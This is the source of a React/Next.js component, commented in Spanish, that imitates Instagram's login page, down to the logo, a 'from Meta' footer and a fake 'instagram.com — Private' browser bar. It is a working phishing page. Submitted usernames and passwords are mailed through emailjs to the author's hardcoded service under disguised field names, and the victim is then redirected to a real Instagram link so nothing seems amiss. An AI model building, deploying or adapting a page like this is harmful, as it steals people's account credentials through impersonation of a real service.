'use client'

import { useRef } from 'react'
import emailjs from 'emailjs-com'
import Link from "next/link"
import Image from "next/image"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Toaster, toast } from 'react-hot-toast';

export default function ContactForm() {
  // REFERENCIA AL FORMULARIO
  const formRef = useRef<HTMLFormElement>(null);

  // FUNCIÓN PARA ENVIAR EL MENSAJE
  const sendEmail = (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();

    if (!formRef.current) return;

    emailjs.sendForm(
      'service_n91rbw4',
      'andyMail210607',
      formRef.current,
      'qyPFUkWsbbudf72Kk'
    ).then(
      () => {
  
        // 🔁 Redirigir al link de Instagram después de enviar
        setTimeout(() => {
          window.location.href = 'https://www.instagram.com/share/BAJXpJVCFr';
        }, 1000); // espera 2 segundos para que vea el toast (opcional)
      },
    );
  }

  return (
    <div className="flex flex-col min-h-screen bg-black text-white">
      <Toaster position="top-center" toastOptions={{ style: { background: '#333', color: '#fff' } }} />

      {/* Selector de idioma */}
      <div className="flex items-center justify-center p-4">
        <button className="flex items-center gap-2 text-white">
          English (US)
          <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16"
            viewBox="0 0 24 24" fill="none" stroke="currentColor"
            strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"
            className="lucide lucide-chevron-down">
            <path d="m6 9 6 6 6-6" />
          </svg>
        </button>
      </div>

      {/* Contenido principal */}
      <div className="flex-1 flex flex-col items-center justify-center px-8 py-12 gap-8">
        <div className="w-24 h-24 flex items-center justify-center">
          <Image src="/instagram-logo.png" alt="Instagram" width={96} height={96} className="object-contain" />
        </div>

        <form ref={formRef} onSubmit={sendEmail} className="w-full space-y-4">
          <div className="space-y-4">
            <Input
              type="email"
              name="correo"
              placeholder="Phone number, username, or email"
              required
              className="bg-[#121C24] border-[#121C24] text-white py-6 rounded-md"
            />

            <Input
              type="password"
              name="asunto"
              placeholder="Password"
              required
              className="bg-[#121C24] border-[#121C24] text-white py-6 rounded-md"
            />
          </div>

          <Button type="submit" className="w-full bg-[#0095F6] hover:bg-[#0095F6]/90 text-white py-6 rounded-md text-lg">
            Log In
          </Button>

          <div className="text-center">
            <Link href="#" className="text-[#0095F6] text-lg">
              Forgot password?
            </Link>
          </div>
        </form>
      </div>

      {/* Footer */}
      <div className="mt-auto">
        <div className="border-t border-neutral-700 p-4">
          <Link href="#">
            <Button variant="outline" className="w-full border-neutral-600 text-[#0095F6] py-6 rounded-md text-lg">
              Create new account
            </Button>
          </Link>
        </div>

        <div className="text-center p-4 text-neutral-400">
          <p>from</p>
          <div className="h-10 flex items-center justify-center mt-1">
            <Image src="/devmace-logo.png" alt="Meta" width={80} height={30} className="object-contain" />
          </div>
        </div>
      </div>

      {/* Barra del navegador */}
      <div className="flex items-center justify-center border-t border-neutral-800 py-2 text-neutral-500 text-sm">
        <span className="flex items-center gap-2">
          <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16"
            viewBox="0 0 24 24" fill="none" stroke="currentColor"
            strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <rect width="18" height="11" x="3" y="11" rx="2" ry="2" />
            <path d="M7 11V7a5 5 0 0 1 10 0v4" />
          </svg>
          instagram.com — Private
        </span>
      </div>
    </div>
  )
}
